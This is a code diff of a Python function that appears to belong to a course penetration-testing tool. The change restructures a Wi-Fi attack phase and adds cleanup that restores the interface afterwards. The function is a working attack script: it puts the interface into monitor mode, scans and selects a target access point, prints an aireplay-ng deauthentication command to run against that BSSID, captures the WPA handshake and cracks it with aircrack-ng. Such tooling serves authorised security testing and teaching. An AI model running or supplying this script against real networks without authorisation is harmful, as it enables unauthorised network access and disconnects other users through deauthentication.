@@ -523,99 +523,132 @@ def phase1_wifi_crack() -> PhaseResult:
 
     cap   = CFG["wifi"]["capture_file"]
     iface = CFG["wifi"]["interface"]
-    mon   = CFG["wifi"]["monitor_iface"]
     wl    = _resolve_wordlist(CFG["wifi"]["wordlist"])
 
-    # ── Monitor mode (native kernel — no airmon-ng rename quirks) ────────────
-    ok(f"Putting {iface} into monitor mode...")
-    run_cmd(f"sudo ifconfig {iface} down",          capture=False)
-    run_cmd(f"sudo iwconfig {iface} mode monitor",  capture=False)
-    run_cmd(f"sudo ifconfig {iface} up",            capture=False)
+    def _restore_managed():
+        """Put the interface back into managed mode on exit."""
+        info(f"Restoring {iface} to managed mode...")
+        run_cmd(f"sudo ifconfig {iface} down",         capture=False)
+        run_cmd(f"sudo iwconfig {iface} mode managed", capture=False)
+        run_cmd(f"sudo ifconfig {iface} up",           capture=False)
 
-    # ── Interactive AP scan ───────────────────────────────────────────────────
-    scan_csv = "/tmp/incs4810_scan"
-    info("Scanning for APs (12 s) — please wait...")
-    run_cmd(
-        f"sudo timeout 12 airodump-ng --output-format csv -w {scan_csv} {iface} 2>/dev/null",
-        timeout=18, capture=False,
-    )
-
-    aps = _parse_airodump_csv(f"{scan_csv}-01.csv")
-
-    if not aps:
-        err("No APs found in scan output — check interface name in CFG and try again")
-        r.status  = "failed"
-        r.finding = "AP scan returned no results"
-        return r
-
-    ap_table = Table(
-        title="[bold magenta]Discovered Access Points[/bold magenta]",
-        show_header=True, header_style="bold cyan", border_style="dim",
-    )
-    ap_table.add_column("#",       style="dim",    width=4)
-    ap_table.add_column("SSID",    style="green",  width=24)
-    ap_table.add_column("BSSID",   style="yellow", width=20)
-    ap_table.add_column("Channel", style="cyan",   width=9)
-    ap_table.add_column("Power",   style="white",  width=8)
-    for i, ap in enumerate(aps, 1):
-        ap_table.add_row(str(i), ap["ssid"], ap["bssid"], ap["channel"], ap["power"])
-    console.print(ap_table)
-
-    console.print()
-    raw = Prompt.ask(f"[yellow]Select target AP (1–{len(aps)})[/yellow]").strip()
     try:
-        chosen = aps[int(raw) - 1]
-    except (ValueError, IndexError):
-        err("Invalid selection")
-        r.status  = "failed"
-        r.finding = "No AP selected"
-        return r
+        # ── Monitor mode ──────────────────────────────────────────────────────
+        ok(f"Putting {iface} into monitor mode...")
+        run_cmd(f"sudo ifconfig {iface} down",          capture=False)
+        run_cmd(f"sudo iwconfig {iface} mode monitor",  capture=False)
+        run_cmd(f"sudo ifconfig {iface} up",            capture=False)
 
-    bssid   = chosen["bssid"]
-    channel = chosen["channel"].strip()
-    ok(f"Target: [bold]{chosen['ssid']}[/bold]  BSSID={bssid}  CH={channel}")
-
-    # ── Handshake capture + crack loop ────────────────────────────────────────
-    while True:
-        # Wipe previous captures so airodump-ng always writes -01.cap
-        import glob as _glob
-        for _old in _glob.glob(f"{cap}*.cap"):
-            try: os.remove(_old)
-            except OSError: pass
-
-        ok(f"Capturing handshake on CH {channel} (60 s)...")
-        warn(f"Run deauth in another terminal: sudo aireplay-ng --deauth 10 -a {bssid} {iface}")
+        # ── AP scan (15 s) ────────────────────────────────────────────────────
+        scan_tmp = "/tmp/incs4810_scan"
+        run_cmd(f"sudo rm -f {scan_tmp}*", capture=False)   # clean stale scan files
+        console.print()
+        info("Scanning for access points — 15 s, please wait...")
         run_cmd(
-            f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {iface} 2>/dev/null",
-            timeout=75, capture=False,
+            f"sudo timeout 15 airodump-ng --output-format csv -w {scan_tmp} {iface} 2>/dev/null",
+            timeout=20, capture=False,
         )
 
-        cap_file = f"{cap}-01.cap"
-        if not os.path.exists(cap_file):
-            warn("Capture file not created — interface may have dropped monitor mode")
-        else:
-            ok("Cracking handshake with aircrack-ng...")
-            wl_arg = wl if wl else "/dev/null"
-            rc, out = run_cmd(
-                f"sudo aircrack-ng {cap_file} -w {wl_arg}", timeout=300
-            )
-            if "KEY FOUND" in out:
-                key_line = next((l for l in out.splitlines() if "KEY FOUND" in l), "KEY FOUND")
-                r.status  = "success"
-                r.finding = key_line
-                r.output  = out[-1000:]
-                ok(r.finding)
-                return r
+        aps = _parse_airodump_csv(f"{scan_tmp}-01.csv")
+        if not aps:
+            err("No APs found — check that the interface name in CFG is correct")
+            r.status  = "failed"
+            r.finding = "AP scan returned no results"
+            return r
 
-        # Crack failed — offer retry
+        # ── AP selection table ────────────────────────────────────────────────
+        ap_table = Table(
+            title="[bold magenta]Discovered Access Points[/bold magenta]",
+            show_header=True, header_style="bold cyan", border_style="dim",
+        )
+        ap_table.add_column("#",       style="dim",    width=4)
+        ap_table.add_column("SSID",    style="green",  width=26)
+        ap_table.add_column("BSSID",   style="yellow", width=20)
+        ap_table.add_column("CH",      style="cyan",   width=5)
+        ap_table.add_column("Power",   style="white",  width=8)
+        for i, ap in enumerate(aps, 1):
+            ap_table.add_row(str(i), ap["ssid"], ap["bssid"],
+                             ap["channel"].strip(), ap["power"].strip())
+        console.print(ap_table)
+        console.print("[dim]  Enter the number of the target AP, or [bold]q[/bold] to skip Phase 1[/dim]")
         console.print()
-        if not Confirm.ask("[yellow]Handshake capture failed — retry on this AP?[/yellow]",
-                           default=True):
-            break
 
-    r.status  = "failed"
-    r.finding = "Handshake not cracked (try larger wordlist or longer capture window)"
-    err(r.finding)
+        raw = Prompt.ask(f"[yellow]Target AP #[/yellow]").strip().lower()
+        if raw == "q":
+            r.status  = "skipped"
+            r.finding = "Skipped by operator"
+            return r
+        try:
+            chosen = aps[int(raw) - 1]
+        except (ValueError, IndexError):
+            err(f"'{raw}' is not a valid choice")
+            r.status  = "failed"
+            r.finding = "No AP selected"
+            return r
+
+        bssid   = chosen["bssid"]
+        channel = chosen["channel"].strip()
+        console.print()
+        ok(f"Target locked: [bold green]{chosen['ssid']}[/bold green]  "
+           f"BSSID=[bold]{bssid}[/bold]  CH={channel}")
+
+        # ── Handshake capture + crack loop ────────────────────────────────────
+        while True:
+            # sudo rm clears files owned by root; glob+os.remove fails silently
+            run_cmd(f"sudo rm -f {cap}*", capture=False)
+
+            console.print()
+            console.print(Panel(
+                f"[bold white]Interface :[/bold white] {iface}\n"
+                f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
+                f"[bold white]Channel   :[/bold white] {channel}\n"
+                f"[bold white]Duration  :[/bold white] 60 s\n\n"
+                f"[yellow]Open a second terminal and run:[/yellow]\n"
+                f"[bold cyan]sudo aireplay-ng --deauth 10 -a {bssid} {iface}[/bold cyan]",
+                title="[bold cyan] Capturing Handshake [/bold cyan]",
+                border_style="cyan", expand=False,
+            ))
+
+            run_cmd(
+                f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} "
+                f"-w {cap} {iface} 2>/dev/null",
+                timeout=75, capture=False,
+            )
+
+            cap_file = f"{cap}-01.cap"
+            if not os.path.exists(cap_file):
+                warn("No capture file created — interface may have lost monitor mode")
+            else:
+                ok("Capture file found — running aircrack-ng...")
+                wl_arg = wl if wl else "/dev/null"
+                rc, out = run_cmd(
+                    f"sudo aircrack-ng {cap_file} -w {wl_arg}", timeout=300
+                )
+                if "KEY FOUND" in out:
+                    key_line = next(
+                        (l for l in out.splitlines() if "KEY FOUND" in l), "KEY FOUND"
+                    )
+                    r.status  = "success"
+                    r.finding = key_line
+                    r.output  = out[-1000:]
+                    ok(r.finding)
+                    return r
+
+                warn("aircrack-ng did not find the key")
+
+            console.print()
+            if not Confirm.ask(
+                "[yellow]Retry handshake capture on this AP?[/yellow]", default=True
+            ):
+                break
+
+        r.status  = "failed"
+        r.finding = "Handshake not cracked — try a longer capture or bigger wordlist"
+        err(r.finding)
+
+    finally:
+        _restore_managed()
+
     return r
 
 
